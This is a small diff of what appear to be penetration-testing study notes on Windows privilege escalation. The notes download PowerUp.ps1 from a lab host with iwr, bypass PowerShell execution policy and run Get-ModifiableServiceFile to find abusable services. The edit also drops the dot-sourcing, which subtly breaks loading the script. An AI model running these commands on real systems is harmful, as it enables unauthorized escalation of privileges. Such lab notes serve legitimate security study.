@@ -159,14 +159,14 @@ Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object
           
 PowerUp.ps1 detects priv escalation vectors
           
-``` iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
+iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
 
-PS C:\Users\dave> powershell -ep bypass
-...
-PS C:\Users\dave>  . .\PowerUp.ps1
+ powershell -ep bypass
 
-PS C:\Users\dave> Get-ModifiableServiceFile 
-          ```
+.\PowerUp.ps1
+
+ Get-ModifiableServiceFile 
+
           
 
           
